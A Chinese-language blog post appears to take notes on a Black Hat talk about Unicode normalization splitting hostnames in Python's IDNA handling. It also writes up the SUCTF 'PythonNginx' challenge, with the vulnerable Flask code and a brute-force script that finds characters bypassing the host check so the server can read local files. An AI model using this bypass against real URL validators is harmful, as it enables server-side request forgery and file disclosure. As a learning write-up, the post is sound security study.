<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
    

    <!--Author-->
    
        <meta name="author" content="Luc1fer">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="HostSplit-Exploitable">
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在。">
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="Luc1fer&#39;blog">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>HostSplit-Exploitable - Luc1fer&#39;blog</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories/">
                    Categories
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2019/08/22/HostSplit/">
                HostSplit-Exploitable
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-08-22</span>
            
            
            
                <span class="category">
                    <a href="/categories/ctf/">ctf</a>
                </span>
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <p>🐱黑帽大会议题</p>
<a id="more"></a>
<p>8/22/2019 11:39:23 AM </p>
<h1 id="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习"><a href="#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习" class="headerlink" title="HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习"></a>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习</h1><h2 id="IDN-与-UTF-8"><a href="#IDN-与-UTF-8" class="headerlink" title="IDN 与 UTF-8"></a>IDN 与 UTF-8</h2><p><strong>IDN</strong></p>
<blockquote>
<p>国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域名。<br>科研人员又将纯数字表示的IP地址基础上推出更加便于记忆的字符型访问标识，即基于IP地址的域名系统。这些域名只能使用63个ASCII字符（”a-z”，”A-Z”，”0-9”，”-“）. 随着互联网在非英语国家的迅猛发展，九十年代末期国际互联网界提出了将原本只能使用63个ASCII字符的域名，采用本地语言文字来表示，也就是出现了对多语种域名的需求。</p>
</blockquote>
<p><a href="http://中国政府.政务/" target="_blank" rel="noopener">http://中国政府.政务/</a></p>
<p>这是我国的政府网站！</p>
<p><strong>UTF-8</strong></p>
<blockquote>
<p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字符编码，由Ken Thompson于1992年创建，现在已经标准化为RFC 3629。UTF-8用1到4个字节编码Unicode字符。用在网页上可以统一页面显示中文简体繁体及其它语言.</p>
</blockquote>
<p>Puny 编码 (Punycode)</p>
<blockquote>
<p>这是一个简易而准确的IDN ASCII 编码系统 (ASCII-Compatible Encoding (ACE))。它能转换一系列的 字符编码成为字符以符合主机名称(hostname)标准 (ASCII 字母，数位和连字符号)。<br>例: xn–0zwm56d.test </p>
</blockquote>
<pre><code>中国.政府-&gt;xn--fiqs8s.xn--mxtq1m</code></pre><h2 id="Unicode-➔-ASCII-–-A-Two-Step-Process"><a href="#Unicode-➔-ASCII-–-A-Two-Step-Process" class="headerlink" title="Unicode ➔ ASCII – A Two Step Process"></a>Unicode ➔ ASCII – A Two Step Process</h2><ol>
<li>Normalization Convert characters to a “standardized form”.</li>
<li>Punycoding Turn Unicode into ASCII.</li>
</ol>
<p>意思就是说IDN的使用底层还是ASCII的功劳。先转换成标准形式然后进行puny编码。</p>
<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg" alt="转换过程"></p>
<h2 id="Splitting-Hostnames"><a href="#Splitting-Hostnames" class="headerlink" title="Splitting Hostnames"></a>Splitting Hostnames</h2><pre><code>https://evil.c℀.Example.com</code></pre><p>我们对他进行转换成ASCII会发生什么？</p>
<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg" alt="Normalizing "></p>
<pre><code>https://evil.ca/c.Example.com</code></pre><p><strong>No need to Punycode anything – it’s all ASCII now!</strong>也就是不用再次编码已经可以解析了</p>
<h2 id="python-utf-8-unicode-ascii互转"><a href="#python-utf-8-unicode-ascii互转" class="headerlink" title="python utf-8,unicode,ascii互转"></a>python utf-8,unicode,ascii互转</h2><p>unicode-&gt;ascii</p>
<pre><code>&gt;&gt;&gt; ord(u&apos;脑&apos;)
33041</code></pre><p>ascii-&gt;unicode</p>
<pre><code>&gt;&gt;&gt; chr(33041)
&apos;脑</code></pre><p>unicode &lt;=&gt; utf-8</p>
<pre><code>&gt;&gt;&gt; n = u.encode(&apos;utf8&apos;)
&gt;&gt;&gt; n
b&apos;\xe5\xb1\x8c&apos;

&gt;&gt;&gt; m = n.decode(&apos;utf8&apos;)</code></pre><p>注：linux默认编码为unicode，若为其他两种编码进行转换，需unicode作为“媒介</p>
<h2 id="Python-was-vulnerable"><a href="#Python-was-vulnerable" class="headerlink" title="Python was vulnerable"></a>Python was vulnerable</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlsplit, urlunsplit 
&gt;&gt;&gt; url = &apos;http://canada.c℀.microsoft.com/some.txt&apos; 
&gt;&gt;&gt; parts = list(urlsplit(url)) 
&gt;&gt;&gt; host = parts[1] 
&gt;&gt;&gt; host &apos;canada.c℀.microsoft.com&apos; 
&gt;&gt;&gt; newhost = [] 
&gt;&gt;&gt; for h in host.split(&apos;.&apos;): 
... newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) 
... 
&gt;&gt;&gt; parts[1] = &apos;.&apos;.join(newhost) 
&gt;&gt;&gt; finalUrl = urlunsplit(parts) 
&gt;&gt;&gt; finalUrl 
&apos;http://canada.ca/c.microsoft.com/some.txt&apos; </code></pre><h2 id="Python-had-an-extra-variant"><a href="#Python-had-an-extra-variant" class="headerlink" title="Python had an extra variant"></a>Python had an extra variant</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse 
&gt;&gt;&gt; r=&apos;http://bing.com&apos;+u&apos;\uFF03&apos;+&apos;:password@products.office.com&apos; 
&gt;&gt;&gt; o = urlparse(r) 
&gt;&gt;&gt; o.hostname &apos;products.office.com&apos; 
&gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;) 
&gt;&gt;&gt; a &apos;http://bing.com#:password@products.office.com&apos; 
&gt;&gt;&gt; o = urlparse(a) 
&gt;&gt;&gt; o.hostname 
&apos;bing.com&apos;</code></pre><h2 id="SUCTF-PythonNginx"><a href="#SUCTF-PythonNginx" class="headerlink" title="SUCTF PythonNginx"></a>SUCTF PythonNginx</h2><p>SUCTF中的一道题：</p>
<pre><code>    @app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])
def getUrl():
    url = request.args.get(&quot;url&quot;)
    host = parse.urlparse(url).hostname
    if host == &apos;suctf.cc&apos;:
        return &quot;我扌 your problem? 111&quot;
    parts = list(urlsplit(url))
    host = parts[1]
    if host == &apos;suctf.cc&apos;:
        return &quot;我扌 your problem? 222 &quot; + host
    newhost = []
    for h in host.split(&apos;.&apos;):
        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))
    parts[1] = &apos;.&apos;.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]
    host = parse.urlparse(finalUrl).hostname
    if host == &apos;suctf.cc&apos;:
        return urllib.request.urlopen(finalUrl).read()
    else:
        return &quot;我扌 your problem? 333&quot;</code></pre><p>爆破最后一位c</p>
<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url=&quot;http://suctf.c{}&quot;.format(uni)
        try:
            if getUrl(url):
                print(&apos;11&apos;)
                print(&quot;str: &quot;+uni+&apos; unicode: \\u&apos;+str(hex(x))[2:])
        except:
            pass


def getUrl(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == &apos;suctf.cc&apos;:
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == &apos;suctf.cc&apos;:
        return False
    newhost = []
    for h in host.split(&apos;.&apos;):
        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))
    parts[1] = &apos;.&apos;.join(newhost)
    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]
    host = parse.urlparse(finalUrl).hostname
    if host == &apos;suctf.cc&apos;:
        return True
    else:
        return False

if __name__==&quot;__main__&quot;:
    get_unicode()

str: �G unicode: \u2105
str: �� unicode: \uff23
str: �� unicode: \uff43
[Finished in 6.5s]</code></pre><p>我们看一下各个判断的结果</p>
<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
url = &apos;http://canada.c℀.microsoft.com/some.txt&apos;
parts = parse.urlparse(url)
&gt;&gt;&gt; parts
ParseResult(scheme=&apos;http&apos;, netloc=&apos;canada.c℀.microsoft.com&apos;, path=&apos;/some.txt&apos;, params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;)
&gt;&gt;&gt; host = parts.hostname
&gt;&gt;&gt; host
&apos;canada.c℀.microsoft.com&apos;
&gt;&gt;&gt; parts1 = list(urlsplit(url))
&gt;&gt;&gt; parts1
[&apos;http&apos;, &apos;canada.c℀.microsoft.com&apos;, &apos;/some.txt&apos;, &apos;&apos;, &apos;&apos;]</code></pre><p>可以看到已经可以绕过判断了</p>
<h3 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统再会将网址提交DNS域名解析服务器进行IP地址的解析。</p>
<h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>中文意思：本地文件传输协议<br>什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。<br>如何使用File：要使用File协议，基本的格式如下：file:///文件路径，比如要打开F盘flash文件夹中的1.swf文件，那么可以在资源管理器或浏览器地址栏中输入：file:///f:/flash/1.swf回车。</p>
<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p> Nginx的配置文件是一个纯文本文件，它一般位于Nginx安装目录的conf目录下，整个配置文件是以block的形式组织的。每个block一般以一个大括号“{”来表示。block 可以分为几个层次，整个配置文件中Main命令位于最高层，在Main层下面可以有Events、 HTTP等层级，而在HTTP层中又包含Server层，即server block, serverblock中又可分为location层，并且一个server block中可以包含多个location block。</p>
<p>nginx配置文件路径</p>
<pre><code>[root@localhost vhost]# locate nginx.conf
/usr/local/nginx/conf/nginx.conf
/usr/local/nginx/conf/nginx.conf.default</code></pre><p>hosts文件绑定本地回环地址，尝试file读文件</p>
<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg" alt="尝试读文件"></p>
<p>读nginx配置文件</p>
<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg" alt="读配置文件"></p>
<p>读flag</p>
<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg" alt="读flag"></p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/python/">#python</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2019/08/31/JavaScript原型污染/">JavaScript Prototype 污染攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/30/SSTI/">SSTI-服务器端模板注入</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/22/HostSplit/">HostSplit-Exploitable</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
            </li>
            
        </ul>
    </div>



            
<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
    <h2>Categories</h2>
    <ul>
        
        <li>
            <a class="footer-post" href="/categories/比赛回顾/">比赛回顾</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/docker/">docker</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/wp/">wp</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/渗透测试/">渗透测试</a>
        </li>
        
    </ul>
</div>

        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/BrainLyh">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:brainsemail@163.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>